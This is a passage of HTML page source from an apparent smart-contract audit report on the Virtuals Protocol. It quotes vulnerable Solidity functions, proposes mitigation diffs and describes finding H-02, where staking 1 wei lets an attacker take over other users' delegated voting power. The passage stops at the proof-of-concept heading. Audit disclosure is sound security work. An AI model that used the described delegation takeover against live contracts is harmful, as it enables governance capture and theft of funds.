class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 agentShares = amount - protocolShares;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        _prepareAgentsRewards(agentShares, settings);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        return SafeCast.toUint32(_mainRewards.length - 1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // AgentRewardV2::_distributeValidatorRewards()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function _distributeValidatorRewards(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 amount,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 virtualId,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint48 rewardId,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 totalStaked\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    ) private {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        IAgentNft nft = IAgentNft(agentNft);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Calculate weighted validator shares\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 validatorCount = nft.validatorCount(virtualId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        uint256 totalProposals = nft.totalProposals(virtualId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        for (uint256 i = 0; i \u0026lt; validatorCount; i++) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            address validator = nft.validatorAt(virtualId, i);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            // Get validator revenue by votes weightage\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            address stakingAddress = getVirtualTokenAddress(nft, virtualId);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            uint256 votes = IERC5805(stakingAddress).getVotes(validator);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            uint256 validatorRewards = (amount * votes) / totalStaked;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            // Calc validator reward based on participation rate\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            uint256 participationReward = totalProposals == 0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                ? 0\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e                : (validatorRewards * nft.validatorScore(virtualId, validator)) / totalProposals;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;            _validatorRewards[validator][rewardId] = participationReward;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e@\u0026gt;            validatorPoolRewards += validatorRewards - participationReward;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // AgentRewardV2::withdrawValidatorPoolRewards()\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function withdrawValidatorPoolRewards(address recipient) external onlyGov {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(validatorPoolRewards \u0026gt; 0, \u0026quot;No validator pool rewards\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        IERC20(rewardToken).safeTransfer(recipient, validatorPoolRewards);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        validatorPoolRewards = 0;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eAdd access control to \u003ccode\u003eaddValidator()\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"3\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e- function addValidator(uint256 virtualId, address validator) public {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+ function addValidator(uint256 virtualId, address validator) public onlyRole(VALIDATOR_ADMIN_ROLE) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    if (isValidator(virtualId, validator)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        return;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    _addValidator(virtualId, validator);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    _initValidatorScore(virtualId, validator);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eVirtuals marked as informative\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"h-02-anybody-can-control-a-users-delegate-by-calling-agentvetokenstake-with-1-wei\" style=\"position:relative;\"\u003e\u003ca href=\"#h-02-anybody-can-control-a-users-delegate-by-calling-agentvetokenstake-with-1-wei\" aria-label=\"h 02 anybody can control a users delegate by calling agentvetokenstake with 1 wei permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-5\"\u003e[H-02] Anybody can control a user’s delegate by calling \u003ccode\u003eAgentVeToken.stake()\u003c/code\u003e with 1 wei\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-94\"\u003eBowTiedOriole\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-299\"\u003e0x1982us\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-406\"\u003eBlackAdam\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-755\"\u003echupinexx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-141\"\u003eEgbe\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-151\"\u003eIshenxx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-701\"\u003enatachi\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-698\"\u003ePelz\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentVeToken.sol#L80\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/main/contracts/virtualPersona/AgentVeToken.sol#L80\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eAgentVeToken.stake()\u003c/code\u003e function will automatically update the delegatee for the receiver. A malicious user can stake 1 wei of the LP token, set the receiver to be a user with an high balance of the veTokens, and set themselves as the delegatee. \u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"4\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003estake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecanStake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Staking is disabled for private agent\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Either public or first staker\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Cannot stake 0\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Insufficient asset token balance\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eallowance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Insufficient asset token allowance\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estakingTokenToVirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(!\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisBlacklisted\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Agent Blacklisted\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialLock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eregistry\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddValidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_mint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_delegate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edelegatee\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// @audit-high Anybody can change delegate if they stake 1 wei LP\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balanceCheckpoints\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epush\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eclock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eSafeCast\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoUint208\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSince these are the tokens that are used as voting power in the AgentDAO, a malicious user can donate 1 wei to multiple users with high balances, receive a majority voting power, then submit a malicious proposal.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eEither remove the automatic call to \u003ccode\u003e_delegate\u003c/code\u003e or only do the call if \u003ccode\u003esender == receiver\u003c/code\u003e.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept\" aria-label=\"proof of concept permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" 